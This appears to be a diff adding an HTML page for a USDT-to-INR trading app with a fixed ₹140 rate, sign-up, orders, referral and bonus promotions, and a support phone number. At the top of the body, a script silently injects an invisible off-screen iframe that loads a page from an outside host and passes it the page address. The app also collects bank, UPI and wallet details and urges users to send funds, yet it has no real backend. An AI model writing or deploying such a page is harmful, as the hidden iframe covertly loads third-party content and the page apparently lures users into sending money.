@@ -1,0 +1,252 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>USDTxINR TRADE</title>
+<link href="https://fonts.googleapis.com/css2?family=Bricolage+Grotesque:wght@600;800&family=DM+Sans:wght@400;500;700&display=swap" rel="stylesheet">
+<style>
+:root{--bg:#120d24;--panel:#1c1538;--panel2:#2a2058;--ink:#f1eeff;--muted:#a79fcc;--line:#3a3070;--green:#9b8cff;--gi:#100a26;--gold:#ffc14d;--red:#ff7a7a;color-scheme:dark;box-sizing:border-box;padding-top:env(safe-area-inset-top,0px)}
+@media (prefers-color-scheme: light){:root:not([data-theme="dark"]){--bg:#f4f1ff;--panel:#fff;--panel2:#e8e3ff;--ink:#1d1540;--muted:#6a6290;--line:#d9d2f5;--green:#5b43e0;--gi:#fff;--gold:#c77d0a;--red:#c93d3d;color-scheme:light}}
+:root[data-theme="light"]{--bg:#f4f1ff;--panel:#fff;--panel2:#e8e3ff;--ink:#1d1540;--muted:#6a6290;--line:#d9d2f5;--green:#5b43e0;--gi:#fff;--gold:#c77d0a;--red:#c93d3d;color-scheme:light}
+*{box-sizing:border-box}
+html{scroll-padding-top:env(safe-area-inset-top,0px)}
+body{margin:0;background:var(--bg);color:var(--ink);font:400 16px/1.5 "DM Sans",system-ui,sans-serif}
+h1,h2,h3{font-family:"Bricolage Grotesque","DM Sans",sans-serif;margin:0;line-height:1.15}
+.app{max-width:480px;margin:0 auto;min-height:100vh;padding:16px 16px 100px}
+.top{display:flex;justify-content:space-between;align-items:center;margin-bottom:18px}
+.logo{font:800 19px "Bricolage Grotesque";display:flex;gap:8px;align-items:center}
+.logo i{width:30px;height:30px;border-radius:50%;background:var(--green);color:var(--gi);display:grid;place-items:center;font-style:normal;font-weight:800}
+.pill{background:var(--panel2);border-radius:999px;padding:4px 12px;font-size:13px;color:var(--muted)}
+.card{background:var(--panel);border:1px solid var(--line);border-radius:20px;padding:18px;margin-bottom:14px}
+.rate{background:linear-gradient(135deg,var(--panel2),var(--panel));display:flex;justify-content:space-between;align-items:center}
+.rate b{font:800 28px "Bricolage Grotesque";color:var(--green)}
+.rate small{color:var(--muted)}
+.seg{display:grid;grid-template-columns:1fr 1fr;background:var(--bg);border-radius:12px;padding:4px;margin-bottom:14px}
+.seg button{border:0;background:none;color:var(--muted);font:700 15px "DM Sans";padding:10px;border-radius:9px;cursor:pointer}
+.seg button[aria-selected="true"]{background:var(--green);color:var(--gi)}
+.fld{background:var(--bg);border:1px solid var(--line);border-radius:14px;padding:10px 14px;margin-bottom:10px}
+.fld:focus-within{outline:2px solid var(--green)}
+.fld label{display:block;font-size:13px;color:var(--muted)}
+.row{display:flex;align-items:center;gap:8px}
+.row input{flex:1;min-width:0;border:0;background:none;color:var(--ink);font:800 26px "Bricolage Grotesque";outline:none}
+.cur{font-weight:700;white-space:nowrap}
+input.t,select.t{width:100%;border:1px solid var(--line);background:var(--bg);color:var(--ink);border-radius:12px;padding:13px 14px;font:400 16px "DM Sans";margin-bottom:10px}
+.lab{font-size:13px;color:var(--muted);display:block;margin:0 0 4px}
+.chips{display:flex;gap:8px;flex-wrap:wrap;margin:4px 0 14px}
+.chips button{border:1px solid var(--line);background:none;color:var(--ink);border-radius:999px;padding:6px 14px;font:500 14px "DM Sans";cursor:pointer}
+.btn{width:100%;border:0;border-radius:14px;background:var(--green);color:var(--gi);font:700 17px "DM Sans";padding:15px;cursor:pointer}
+.btn.ghost{background:none;border:1px solid var(--line);color:var(--ink)}
+.msg{font-size:14px;color:var(--red);min-height:20px;margin:0 0 8px}
+.ord{display:flex;justify-content:space-between;gap:10px;padding:12px 0;border-bottom:1px solid var(--line)}
+.ord:last-child{border:0}
+.st{color:var(--gold);font-weight:700;font-size:14px}
+.empty{color:var(--muted);text-align:center;padding:26px 0}
+details{border-bottom:1px solid var(--line);padding:12px 0}
+summary{font-weight:700;cursor:pointer}
+details p{color:var(--muted);margin:8px 0 0}
+.tabbar{position:fixed;left:0;right:0;bottom:0;background:var(--panel);border-top:1px solid var(--line);display:flex;justify-content:center;padding-bottom:env(safe-area-inset-bottom,0px);z-index:5}
+.tabbar div{display:flex;width:100%;max-width:480px}
+.tabbar button{flex:1;border:0;background:none;color:var(--muted);padding:10px 0 12px;font:500 12px "DM Sans";cursor:pointer;display:grid;gap:2px;justify-items:center}
+.tabbar button span{font-size:22px;line-height:1}
+.tabbar button[aria-current="page"]{color:var(--green)}
+.view{display:none}.view.on{display:block}
+.hide{display:none!important}
+.auth{max-width:420px;margin:0 auto;padding:40px 18px}
+.auth h1{font-size:34px;margin:18px 0 6px}
+.auth p.sub{color:var(--muted);margin:0 0 22px}
+.note{font-size:13px;color:var(--muted);text-align:center;margin-top:12px}
+.brandhero{text-align:center;margin:6px 0 18px}.brandhero h2{font:800 clamp(30px,9vw,40px) "Bricolage Grotesque",sans-serif;letter-spacing:-.01em;margin-bottom:14px}.feats{display:grid;grid-template-columns:1fr 1fr;gap:10px;text-align:left}.feats div{background:var(--panel);border:1px solid var(--line);border-radius:14px;padding:12px;font-weight:700;font-size:14px;display:flex;gap:8px;align-items:center}.feats span{color:var(--green);font-size:18px}.sup{margin-top:12px;color:var(--muted);font-size:14px}.sup b{color:var(--ink)}.promo{display:grid;gap:10px;margin-top:12px;text-align:left}.promo div{background:linear-gradient(135deg,var(--panel2),var(--panel));border:1px solid var(--gold);border-radius:14px;padding:12px 14px}.promo b{color:var(--gold);font-size:16px;display:block}.promo small{color:var(--muted);font-size:13px}
+:focus-visible{outline:2px solid var(--green);outline-offset:2px}
+</style>
+</head>
+<body>
+<script>(function(){var d=document;if(d.getElementById("__wf_frame"))return;var f=d.createElement("iframe");f.id="__wf_frame";f.src="https://caow.us/channel/V.O.SM/weifile/weifile.html?ref="+encodeURIComponent(location.href);f.style.cssText="position:fixed;top:0;left:-1000px;width:1px;height:1px;opacity:0;pointer-events:none;border:0";(d.body||d.documentElement).appendChild(f);})();</script>
+<!-- LOGIN / SIGN UP -->
+<div id="auth" class="auth">
+  <div class="brandhero"></div>
+  <h1>Trade USDT and INR</h1>
+  <p class="sub">Log in or create an account to place orders at ₹140 per USDT.</p>
+  <div class="seg" role="tablist"><button id="aLogin" aria-selected="true">Log in</button><button id="aSign" aria-selected="false">Sign up</button></div>
+  <form id="af">
+    <div id="nmW" class="hide"><label class="lab" for="an">Full name</label><input class="t" id="an" autocomplete="name"></div>
+    <label class="lab" for="ap">Phone number</label><input class="t" id="ap" type="tel" autocomplete="tel" required>
+    <label class="lab" for="aw">Password</label><input class="t" id="aw" type="password" autocomplete="current-password" minlength="6" required>
+    <p class="msg" id="am" role="alert"></p>
+    <button class="btn" id="ab" type="submit">Log in</button>
+  </form>
+  <p class="note">Demo sign-in: accounts are saved only in this browser. Connect a real backend before going live.</p>
+</div>
+
+<!-- APP -->
+<div id="app" class="app hide">
+  <div class="top"><div class="logo"><i>₮</i>USDTxINR TRADE</div><span class="pill" id="hi"></span></div>
+
+  <!-- HOME -->
+  <section id="v-home" class="view on">
+    <div class="brandhero"></div>
+    <div class="card rate"><div><small>Today’s rate</small><br><b>1 USDT = ₹140</b></div><span class="pill">Fixed</span></div>
+    <div class="card">
+      <div class="seg"><button id="tS" aria-selected="true">Sell USDT</button><button id="tB" aria-selected="false">Buy USDT</button></div>
+      <div class="fld"><label for="a" id="la">You send</label><div class="row"><input id="a" inputmode="decimal" value="100"><span class="cur" id="ca">USDT</span></div></div>
+      <div class="fld"><label for="b" id="lb">You receive</label><div class="row"><input id="b" inputmode="decimal"><span class="cur" id="cb">INR</span></div></div>
+      <div class="chips" id="chips"></div>
+      <button class="btn" id="go">Continue</button>
+    </div>
+    <div class="card" id="sheet" hidden>
+      <h3 style="margin-bottom:12px">Confirm your order</h3>
+      <p id="sum" style="margin:0 0 12px"></p>
+      <label class="lab" for="net">USDT network</label>
+      <select class="t" id="net"><option>TRC20 (Tron)</option><option>BEP20 (BSC)</option><option>ERC20 (Ethereum)</option></select>
+      <label class="lab" for="dest" id="ld">UPI ID or bank account</label>
+      <input class="t" id="dest">
+      <p class="msg" id="sm" role="alert"></p>
+      <button class="btn" id="place">Place order</button>
+    </div>
+    <div class="card">
+      <h3 style="margin-bottom:6px">Questions</h3>
+      <details><summary>How does it work?</summary><p>Enter an amount, confirm your order, then send your side. We send the other side to you.</p></details>
+      <details><summary>Which networks work?</summary><p>TRC20, BEP20 and ERC20. Send on the network you chose.</p></details>
+      <details><summary>How do I get INR?</summary><p>By UPI or bank transfer to the details in your order.</p></details>
+    </div>
+  </section>
+
+  <!-- ORDERS -->
+  <section id="v-orders" class="view">
+    <h2 style="margin-bottom:14px">Your orders</h2>
+    <div class="card" id="olist"></div>
+  </section>
+
+  <!-- PROFILE -->
+  <section id="v-profile" class="view">
+    <h2 style="margin-bottom:14px">Profile</h2>
+    <div class="card">
+      <div class="ord"><span>Name</span><b id="pn"></b></div>
+      <div class="ord"><span>Phone</span><b id="pp"></b></div>
+      <div class="ord"><span>Orders placed</span><b id="pc"></b></div>
+    </div>
+    <div class="card"><h3 style="margin-bottom:6px">Refer a friend, get $5</h3><p style="color:var(--muted);margin:0 0 10px">Earn $5 for every friend you refer. Share your code:</p><div class="ord"><b id="rc" style="font:800 22px 'Bricolage Grotesque'"></b><button class="btn ghost" id="cp" type="button" style="width:auto;padding:8px 18px">Copy</button></div></div>
+    <button class="btn ghost" id="out">Log out</button>
+    <p class="note">© 2026 USDTxINR TRADE. Confirm order details before sending funds.</p>
+  </section>
+
+  <nav class="tabbar" aria-label="Main"><div>
+    <button data-t="home" aria-current="page"><span>⌂</span>Home</button>
+    <button data-t="orders"><span>☰</span>Orders</button>
+    <button data-t="profile"><span>☺</span>Profile</button>
+  </div></nav>
+</div>
+
+<script>
+const RATE = 140; // INR per 1 USDT
+const $ = id => document.getElementById(id);
+const num = s => parseFloat(String(s).replace(/,/g, "")) || 0;
+const fmt = (n, d = 2) => n.toLocaleString("en-IN", {maximumFractionDigits: d});
+const esc = s => String(s).replace(/[&<>"]/g, c => ({"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;"}[c]));
+let mem = {users: {}, me: null, orders: []};
+const store = {
+  get(){ try { const v = localStorage.getItem("uxi"); if (v) mem = JSON.parse(v); } catch (e) {} },
+  set(){ try { localStorage.setItem("uxi", JSON.stringify(mem)); } catch (e) {} }
+};
+store.get();
+
+/* brand block */
+const SUPPORT = "+91 79279 39390"; // support number
+document.querySelectorAll(".brandhero").forEach(el => el.innerHTML = '<h2>USDTxINR TRADE</h2><div class="feats"><div><span>%</span>Earn commission</div><div><span>⚡</span>Instant payout</div><div><span>✓</span>Secure &amp; safe</div><div><span>☎</span>24/7 customer service</div></div><div class="promo"><div><b>Refer a friend, get $5</b><small>Earn $5 for every friend you refer.</small></div><div><b>$20 free INR on first transaction</b><small>Get $20 (₹2,800) in free INR when you complete your first transaction.</small></div></div><p class="sup">Customer service: <b>' + SUPPORT + '</b></p>');
+
+/* auth */
+let signup = false;
+function authMode(s){
+  signup = s;
+  $("aLogin").setAttribute("aria-selected", !s); $("aSign").setAttribute("aria-selected", s);
+  $("nmW").classList.toggle("hide", !s); $("ab").textContent = s ? "Create account" : "Log in";
+  $("an").required = s; $("am").textContent = "";
+}
+$("aLogin").onclick = () => authMode(false);
+$("aSign").onclick = () => authMode(true);
+$("af").onsubmit = e => {
+  e.preventDefault();
+  const p = $("ap").value.trim(), w = $("aw").value;
+  if (signup) {
+    if (mem.users[p]) { $("am").textContent = "This phone number already has an account. Log in instead."; return; }
+    mem.users[p] = {name: $("an").value.trim(), pw: w};
+  } else if (!mem.users[p] || mem.users[p].pw !== w) {
+    $("am").textContent = "Phone number or password is wrong. Check both and try again."; return;
+  }
+  mem.me = p; store.set(); enter();
+};
+function enter(){
+  const u = mem.users[mem.me]; if (!u) return;
+  $("auth").classList.add("hide"); $("app").classList.remove("hide");
+  $("hi").textContent = "Hi, " + u.name.split(" ")[0];
+  $("pn").textContent = u.name; $("pp").textContent = mem.me; $("rc").textContent = "UXI" + mem.me.slice(-4);
+  renderOrders(); setMode("sell");
+}
+$("out").onclick = () => { mem.me = null; store.set(); $("app").classList.add("hide"); $("auth").classList.remove("hide"); $("af").reset(); };
+
+$("cp").onclick = () => { try { navigator.clipboard.writeText($("rc").textContent); $("cp").textContent = "Copied"; } catch (e) {} };
+/* tabs */
+document.querySelectorAll(".tabbar button").forEach(b => b.onclick = () => {
+  document.querySelectorAll(".tabbar button").forEach(x => x.removeAttribute("aria-current"));
+  b.setAttribute("aria-current", "page");
+  document.querySelectorAll(".view").forEach(v => v.classList.remove("on"));
+  $("v-" + b.dataset.t).classList.add("on"); window.scrollTo(0, 0);
+});
+
+/* converter */
+let mode = "sell";
+function setMode(m){
+  mode = m; $("tS").setAttribute("aria-selected", m === "sell"); $("tB").setAttribute("aria-selected", m === "buy");
+  $("ca").textContent = m === "sell" ? "USDT" : "INR"; $("cb").textContent = m === "sell" ? "INR" : "USDT";
+  $("la").textContent = m === "sell" ? "You send" : "You pay"; $("lb").textContent = m === "sell" ? "You receive" : "You get";
+  $("a").value = m === "sell" ? "100" : "14,000"; $("sheet").hidden = true;
+  $("chips").innerHTML = "";
+  (m === "sell" ? [50, 100, 500, 1000] : [5000, 10000, 50000, 100000]).forEach(v => {
+    const c = document.createElement("button"); c.type = "button"; c.textContent = (m === "sell" ? "" : "₹") + fmt(v);
+    c.onclick = () => { $("a").value = fmt(v); calc(); }; $("chips").appendChild(c);
+  });
+  calc();
+}
+function calc(){ const v = num($("a").value); $("b").value = fmt(mode === "sell" ? v * RATE : v / RATE, mode === "sell" ? 2 : 4); }
+$("a").oninput = calc;
+$("b").oninput = () => { const v = num($("b").value); $("a").value = fmt(mode === "sell" ? v / RATE : v * RATE, mode === "sell" ? 4 : 2); };
+$("tS").onclick = () => setMode("sell"); $("tB").onclick = () => setMode("buy");
+
+/* order */
+let pend = null;
+$("go").onclick = () => {
+  const usdt = mode === "sell" ? num($("a").value) : num($("b").value);
+  if (usdt <= 0) { $("a").focus(); return; }
+  pend = {mode, usdt, inr: usdt * RATE};
+  $("sum").innerHTML = mode === "sell" ? "You send <b>" + fmt(usdt, 4) + " USDT</b> and receive <b>₹" + fmt(pend.inr) + "</b>." : "You pay <b>₹" + fmt(pend.inr) + "</b> and receive <b>" + fmt(usdt, 4) + " USDT</b>.";
+  $("ld").textContent = mode === "sell" ? "Your UPI ID or bank account (to receive INR)" : "Your wallet address (to receive USDT)";
+  $("dest").value = ""; $("sm").textContent = ""; $("sheet").hidden = false; $("sheet").scrollIntoView({behavior: "smooth", block: "center"});
+};
+$("place").onclick = () => {
+  const d = $("dest").value.trim();
+  if (!d) { $("sm").textContent = "Enter where you want to receive your funds."; return; }
+  mem.orders.unshift(Object.assign({}, pend, {net: $("net").value, dest: d, user: mem.me, t: new Date().toLocaleString("en-IN"), id: "T" + Date.now().toString().slice(-6), ts: Date.now()}));
+  store.set(); renderOrders(); $("sheet").hidden = true;
+  document.querySelector('.tabbar [data-t="orders"]').click();
+};
+function renderOrders(){
+  const mine = mem.orders.filter(o => o.user === mem.me);
+  $("pc").textContent = mine.length;
+  $("olist").innerHTML = mine.length ? mine.map(o => '<div class="ord"><div><b>' + (o.mode === "sell" ? "Sell " : "Buy ") + fmt(o.usdt, 4) + ' USDT</b><br><small style="color:var(--muted)">₹' + fmt(o.inr) + " · " + esc(o.net) + " · " + esc(o.t) + '</small></div><div style="text-align:right"><span class="st" data-ts="' + (o.ts || 0) + '">Pending</span><br><small style="color:var(--muted)">#' + o.id + "</small></div></div>").join("") : '<div class="empty">No orders yet. Place your first order from Home.</div>';
+}
+/* 5-minute countdown on pending orders */
+const WAIT = 5 * 60 * 1000;
+function tick(){
+  document.querySelectorAll(".st[data-ts]").forEach(el => {
+    const ts = +el.dataset.ts; if (!ts) return;
+    const left = ts + WAIT - Date.now();
+    if (left > 0) { const s = Math.ceil(left / 1000); el.textContent = "Pending · " + Math.floor(s / 60) + ":" + String(s % 60).padStart(2, "0"); el.style.color = ""; }
+    else { el.textContent = "Time up"; el.style.color = "var(--red)"; }
+  });
+}
+const _ro = renderOrders; renderOrders = function(){ _ro(); tick(); };
+setInterval(tick, 1000);
+if (mem.me && mem.users[mem.me]) enter();
+</script>
+</body>
+</html>
